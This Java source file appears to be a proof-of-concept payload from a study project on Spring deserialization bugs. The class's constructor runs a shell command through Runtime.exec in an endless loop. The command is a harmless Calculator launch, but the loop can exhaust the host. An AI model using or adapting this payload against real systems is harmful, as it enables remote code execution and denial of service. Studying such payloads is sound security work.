package com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ExportObject {
    public static String exec(String cmd) throws Exception {
        String sb = "";
        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null){
            sb += lineStr + "\n";
        }
        inBr.close();
        in.close();
        return sb;
    }
    public ExportObject() throws Exception {
        try {
            while(true) {
                String cmd="open /Applications/Calculator.app/";
                exec(cmd);
//                Thread.sleep(1000);
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }


}
